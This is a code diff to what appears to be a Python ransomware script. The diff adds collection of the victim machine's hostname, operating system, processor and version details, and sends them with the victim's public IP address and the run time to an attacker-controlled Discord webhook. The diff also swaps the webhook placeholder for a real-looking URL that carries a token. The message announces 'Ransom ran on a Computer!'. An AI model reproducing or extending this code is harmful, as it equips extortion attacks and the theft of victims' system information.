@@ -25,17 +25,37 @@ for file in os.listdir():
 
 ### If Ransome is ran it sends an alert to Discord server to Webhook API
 
+## Hardware info
+
+oss=('Operating System : ', platform.system())
+hs=('Hostname : ', platform.node())
+ms=("Machine : ", platform.machine())
+pro=("Processor : ", platform.processor())
+rel=("Release : ", platform.release())
+vr=("Version : ", platform.version())
+
+### If Ransome is ran it sends an alert to Discord server to Webhook API
+
 ip=get("https://api.ipify.org").text
 dt = datetime.datetime.now()
 nowt=dt.strftime("%Y-%m-%d %H:%M:%S")
 
-url = "YOUR DISCORD WEBHOOK GOES HERE"
-x = f"""```
+url = "https://discord.com/api/webhooks/975945287594024990/1Tdz8Hk8ymc5oqzQNUdqHSza5NWwDjWeKPMy8IqxRQ6pCeXdu9yojSJNBNfgl9e4_8R3"
+x = f"""**```
 Ransom ran on a Computer! 
 --------------------------
 Target IP Address ~> {ip} 
 ---------------------------------
-Time ~> {nowt}```"""
+Time ~> {nowt}
+---------------------
+Hardware Information:
+
+{oss}
+{hs}
+{ms}
+{pro}
+{rel}
+{vr}```**"""
 
 r=requests.post(url, data={"content": x})
 
